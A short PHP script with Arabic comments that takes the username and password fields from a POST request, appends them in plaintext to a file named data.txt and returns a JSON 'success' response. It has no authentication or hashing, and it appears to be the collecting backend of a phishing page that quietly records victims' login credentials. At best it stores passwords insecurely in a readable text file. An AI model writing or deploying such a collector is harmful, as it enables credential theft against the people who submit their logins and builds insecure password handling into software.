<?php
    // استقبال البيانات المرسلة عبر POST
    $username = $_POST['username'];
    $password = $_POST['password'];

    // فتح ملف لتخزين البيانات
    $file = fopen("data.txt", "a");
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    // إرسال استجابة
    echo json_encode(["status" => "success"]);
?>
